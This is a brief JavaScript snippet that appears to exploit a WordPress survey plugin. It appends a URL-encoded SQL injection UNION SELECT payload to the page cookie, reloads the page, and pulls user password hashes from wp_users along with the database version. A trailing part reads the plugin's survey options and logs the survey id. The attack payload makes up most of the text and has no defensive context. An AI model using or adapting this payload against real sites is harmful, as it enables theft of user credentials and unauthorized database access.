var cookie = document.cookie.slice(0,document.cookie.lastIndexOf('%22'))
var cookie2 = cookie + '%27%29%29+OR+1%3D2+UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2Cgroup_concat%28user_pass%29%2C%40%40version%2C11+FROM+wordpress.wp_users+%23%22%5D'
document.cookie = cookie2
window.location.reload()


var survey_options = JSON.parse(sss_params.survey_options);
console.log(survey_options.survey_id);